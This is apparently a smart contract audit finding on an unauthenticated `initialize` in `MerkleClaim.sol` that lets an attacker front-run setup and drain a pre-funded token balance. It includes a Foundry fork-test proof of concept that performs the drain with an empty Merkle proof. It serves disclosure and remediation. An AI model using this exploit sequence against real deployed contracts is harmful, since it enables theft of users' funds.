### Title

Anyone can initialize `MerkleClaim` with a malicious root and drain its token balance - (`File: contracts/MerkleClaim.sol`)

### Summary

`MerkleClaim.initialize` is unauthenticated and lets the first caller select both the ERC-20 token and the Merkle root. If a claim contract is funded before initialization, or its intended initialization transaction is front-run, an attacker can set the root to a leaf representing their own claim and withdraw the full balance with an empty Merkle proof. This is the same bug class as an attacker-controlled `withdrawRoot`: an unconstrained caller establishes the trusted root used to release funds. [1](#0-0) [2](#0-1) 

### Finding Description

`initialize(bytes32 _merkleRoot, address _token)` only checks that `token == address(0)` and has no deployer, owner, factory, or caller allowlist check. [3](#0-2) 

`claim` computes the leaf as `keccak256(bytes.concat(keccak256(abi.encode(to, amount))))`, verifies it against the stored `merkleRoot`, marks the recipient as claimed, and transfers `amount` tokens. [4](#0-3) 

Because a Merkle root equal to the leaf verifies with an empty proof, the attacker does not need to construct a malicious tree or exploit a proof weakness. They can directly set `merkleRoot` to the leaf for `(attacker, claimBalance)`. An attacker transaction before legitimate initialization is sufficient. [5](#0-4) 

The privileged `sweep` delay does not prevent this. It only lets `TL_MULTISIG` recover remaining tokens after 60 days; it cannot recover tokens already transferred through a valid attacker claim. [6](#0-5) 

### Impact Explanation

An attacker can steal the entire pre-funded ERC-20 balance with a single initialization transaction and a single claim transaction. For example, if the deployment flow funds the claim contract with 1,000,000 USDC before initialization, the attacker can configure `(attacker, 1_000_000e6)` as the root and receive all 1,000,000 USDC.

This breaks the intended one-claim-per-authorized-recipient invariant because the attacker supplies both sides of the authorization relation: they initialize the root and choose the leaf encoded in that root.

### Likelihood Explanation

The attack requires a deployment sequence in which the `MerkleClaim` instance exists uninitialized and is funded, or an initialization transaction that can be front-run before funding. Those are realistic operational sequences for a standalone, cloneable distribution contract because neither deployment nor funding automatically calls `initialize`.

The condition is exploitable by any EOA or contract. No privileged role is required, and the attacker does not need a valid allocation in the intended Merkle tree.

### Recommendation

- Initialize `MerkleClaim` atomically during deployment, preferably through a factory that computes and submits the correct initialization call in the same transaction.
- Add an immutable deployer/factory address and restrict `initialize` to that caller when non-atomic initialization is required.
- Alternatively, convert `token` and `merkleRoot` to constructor arguments for non-clone deployments.
- Prevent transfers into the distribution contract until initialization is complete.
- Consider emitting the expected initialization parameters and validating them in the deployment script before funding.

### Proof of Concept

The following Foundry fork test demonstrates the attack using mainnet USDC. It simulates an operational flow in which the claim contract is deployed and funded before its intended `initialize` transaction is executed:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/MerkleClaim.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract MerkleClaimInitializationTest is Test {
    IERC20 internal constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testUnauthenticatedInitializerDrainsFundedClaim() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        address attacker = makeAddr("attacker");
        uint256 distributionAmount = 1_000_000e6;

        // Operational sequence: deploy the claim contract, then fund it before
        // its intended initialization transaction is mined.
        MerkleClaim claimContract = new MerkleClaim();
        deal(address(USDC), address(claimContract), distributionAmount);

        // Attacker front-runs initialization and chooses a root equal to the
        // leaf for their own full-balance claim.
        bytes32 maliciousLeaf =
            keccak256(bytes.concat(keccak256(abi.encode(attacker, distributionAmount))));

        vm.prank(attacker);
        claimContract.initialize(maliciousLeaf, address(USDC));

        bytes32[] memory emptyProof = new bytes32[](0);

        vm.prank(attacker);
        claimContract.claim(attacker, distributionAmount, emptyProof);

        assertEq(USDC.balanceOf(attacker), distributionAmount);
        assertEq(USDC.balanceOf(address(claimContract)), 0);
    }
}
```

```text
  function claim(address to, uint256 amount, bytes32[] calldata proof) external {
    // Throw if address has already claimed tokens
    if (hasClaimed[to]) revert AlreadyClaimed();

    // Verify merkle proof, or revert if not in tree,
    // double keccak is preferred https://github.com/OpenZeppelin/merkle-tree#user-content-fn-1-786ed85226485d53b8a7834b144c1642
    bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(to, amount))));
    bool isValidLeaf = MerkleProofUpgradeable.verify(proof, merkleRoot, leaf);
    if (!isValidLeaf) revert NotInMerkle();

    // Set address to claimed
    hasClaimed[to] = true;

    // Transfer tokens to claimee
    IERC20Upgradeable(token).transfer(to, amount);
```
